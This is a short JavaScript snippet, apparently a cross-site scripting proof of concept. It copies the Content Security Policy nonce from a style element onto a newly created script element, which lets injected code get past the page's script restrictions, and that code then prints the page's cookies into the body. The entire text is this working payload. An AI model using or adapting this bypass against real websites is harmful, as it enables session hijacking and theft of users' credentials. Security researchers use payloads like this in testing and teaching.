let nonce = document.querySelector("style[nonce]")?.getAttribute("nonce");
let s = document.createElement("script");
s.setAttribute("nonce", nonce);
s.innerHTML = "document.body.innerHTML += '<h1>' + document.cookie + '</h1>';";
document.body.appendChild(s);
